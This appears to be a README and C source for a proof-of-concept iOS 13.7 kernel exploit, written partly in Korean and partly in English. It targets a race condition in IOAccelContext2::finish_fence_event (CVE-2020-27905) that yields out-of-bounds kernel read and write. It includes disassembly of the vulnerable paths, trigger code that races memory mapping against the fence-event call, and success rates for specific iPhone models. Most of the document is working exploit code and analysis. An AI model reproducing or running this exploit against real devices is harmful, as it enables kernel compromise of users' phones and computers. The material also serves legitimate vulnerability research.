## oob_events

#저자commnet

I've updated oob_events exploit and it should work fine 
in on A12+ devices (with 60 % of success rate) and ~95% in devices with lower ram size i.e A10.
Tested on iPhone 11 and iPhone 7.

다음은 PoC 커널 익스플로잇으로, iOS 13.7에서 커널 작업 포트를 얻는 방법을 보여줍니다. 
나중에 PoC를 작성하여 업데이트하겠습니다.


개인 장치에서 사용하거나 탈옥에 사용하지 않는 것이 좋습니다. 
장치가 불안정한 상태가 될 수 있습니다
I dont recommend using it in your personal device or to use it for a jailbreak. 
it may leave your device in unstable state. You’ve been warned.


arm64e의 익스플로잇은 iPhone 9,3 (9/10배 작동)과 달리
그다지 안정적이지 않으며 많은 커널 패닉이 예상되며 약간의 작업이
필요하고 이러한 익스플로잇을 일반화하고 모든 장치에서 작동하기는 어렵습니다.


IOGPU 제품군(IOAcceleratorFamily의 후속 제품)과 
함께 제공되는 iOS 14.1을 확인했지만 버그를 유발하는 
일치하는 패턴을 찾지 못했기 때문에 iOS 13.x 및 
IOAcceleratorFamily를 사용하는 모든 장치(예: macOS)에서만 작동합니다.

IOGPUFamily는 일부 장치(내 생각에는 A10 이상)에만 있습니다. 
예를 들어 A8X는 여전히 IOAcceleratorFamily를 사용합니다.

![8](8.jpg)
## oob_events.c
## IOAccelContext2::finish_fence_event() race condition OOB read/write
```
#if 0
IOAccelContext2::finish_fence_event() race condition OOB read/write

This is a method exposed to user space, it takes a kernel read-only shared memory
(type 2 via clientMemoryForType())  address and treats it as an IOAccelEvents Array.

The user supplied index is checked against the IOAccelEvents array bounds,since there are no
locks held in this method,it is possible to change the array bounds by calling
IOAccelContext2::clientMemoryForType() again in a separate thread, this will expand the size by
multiplying the older size by 2, but we still have a reference to the old shared memory address
with the size of the new one.Therefore, we created a condition where the scalar index is checked
against the new array size but we still have the old shared array reference.
From this condition,we can make IOAccelEvents array points to an arbitrary location, thus perform arbitrary
kernel read and semi-arbitrary kernel write.

fffffff0061f7fa4  ldr        x8,[x0, #0x6a8] .       // x8 takes a reference to shmem_addr but not atomically  
fffffff0061f7fa8  cbz        x8,LAB_fffffff0061f8010
fffffff0061f7fac  mov        x20,x0
fffffff0061f7fb0  ldr        w9,[x0, #0x6d8] .      
fffffff0061f7fb4  cmp        w1,w9, LSR #0x6 .       // scalar input is checked against the array bounds,
fffffff0061f7fb8  b.cs       LAB_fffffff0061f8020
....
fffffff0061f7fd4  blr        x8=>IOAccelEventMachineFast2::finishEventUnlocked                        

By completely controlling the IOAccelEvents content, we can perform multiple memory read/writes,
as shown in the disassembly below :

IOAccelEventMachineFast2::finishEventUnlocked()
LAB_fffffff00620e0c0                            XREF[1]:     fffffff00620e20c(j)  
    fffffff00620e0c0  ldr        x23,[x19, x26, LSL #0x3]
    fffffff00620e0c4  cmn        w23,#0x1
    fffffff00620e0c8  b.eq       LAB_fffffff00620e204
    fffffff00620e0cc  lsr        x22,x23,#0x20
    fffffff00620e0d0  smaddl     x25,w23,w28,x21  // x25 will point to arbitrary address , we completely control w23
    fffffff00620e0d4  ldr        w8,[x25, #0xf0]!  
    fffffff00620e0d8  sub        w8,w22,w8
    fffffff00620e0dc  cmp        w8,#0x1
    fffffff00620e0e0  b.lt       LAB_fffffff00620e204
    fffffff00620e0e4  sxtw       x24,w23
    fffffff00620e0e8  ldr        x8,[x21, #0x28] .  
    fffffff00620e0ec  ldr        x8,[x8, x24, LSL #0x3]
    fffffff00620e0f0  ldr        w8,[x8]   // OOB read since x24 is user controlled
    fffffff00620e0f4  str        w8,[x25]  // <---- OOB write


#endif
#include "client.h"

int start= 0;


io_connect_t iokit_get_connection(const char *name,u32 type)
{
    kern_return_t kr = KERN_SUCCESS;
    io_connect_t conn = MACH_PORT_NULL;
    io_service_t service  = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching(name));
    if (service == IO_OBJECT_NULL) {
        printf("unable to find service \n");
        exit(0);
    }

    kr = IOServiceOpen(service, mach_task_self(), type, &conn);
    //CHECK_MACH_ERR(kr,"IOServiceOpen");
    return conn;
}

void map_memory(io_connect_t c,u32 type, void *addr,size_t *size)
{
    kern_return_t kr = IOConnectMapMemory(c, type, mach_task_self(), (mach_vm_address_t *)addr, &size, 1);
    assert(kr == KERN_SUCCESS);
}


void s_finish_fence_event(io_connect_t c,u64 scalar0)
{
    int selector = 5;
    
    kern_return_t kr = IOConnectCallMethod(c, selector, (void*)&scalar0,1,
                 NULL, 0,
                 NULL, NULL,
                 NULL, NULL);

}

void *do_finish_fence_event(void *arg)
{
    io_connect_t c = *(io_connect_t *) arg;
    while(!start){}
    
    s_finish_fence_event(c, 0x100);
    return NULL;
}

void *do_map_memory(void *arg)
{
    io_connect_t c = *(io_connect_t *) arg;
    while(!start){}
    mach_vm_address_t addr = 0;
    mach_vm_size_t size = 0x0;
    
    //pthread_yield_np();
    map_memory(c,2,&addr,&size);
    return NULL;
}
#define THREADS 0x2
pthread_t ths[THREADS];

void doit(void)
{
    printf("Winning Race \n");
    
    while(1) {
        io_connect_t c = iokit_get_connection("IOGraphicsAccelerator2", 0);
        io_connect_t agxsh = iokit_get_connection("IOGraphicsAccelerator2", 2);
       
        IOConnectAddClient(c,agxsh);
        mach_vm_address_t addr = 0;
        mach_vm_size_t size = 0x0;
    
        char *ptr = (char *)addr;
        map_memory(c,2,&addr,&size);
    
        map_memory(c,0,&addr,&size);
        memset(addr,0xcc,0x4000);
        map_memory(c,1,&addr,&size);
        memset(addr,0x41,0x4000);

        u64 value = ((u64)0x41414141 << 0x20) | 0x42424242;
        memcpy(addr,&value,0x8);
        int thc = 1;
        pthread_t th[thc];

        for(int i=0; i< thc; i++) {
            pthread_create(&th[i],NULL,do_map_memory,(void *)&c);
        }
        for(int i=0; i< THREADS; i++) {
        
            pthread_create(&ths[i],NULL,do_finish_fence_event,(void *)&c);
        }
        
        start = 1;
        for(int i=0; i< THREADS; i++) {
            pthread_join(ths[i],NULL);

        }
        for(int i=0; i< thc; i++) {
            pthread_join(th[i],NULL);
        }
        IOServiceClose(c);
        IOServiceClose(agxsh);
    }

}
```

# 설명
The exploit uses two distinct vulnerabilities which I independently discovered and reported to Apple, CVE-2020-27905 which is a race condition leads to OOB read/write  via arbitrary 32-bit index,and CVE-2020-9964 which is a kernel  information leak bug.
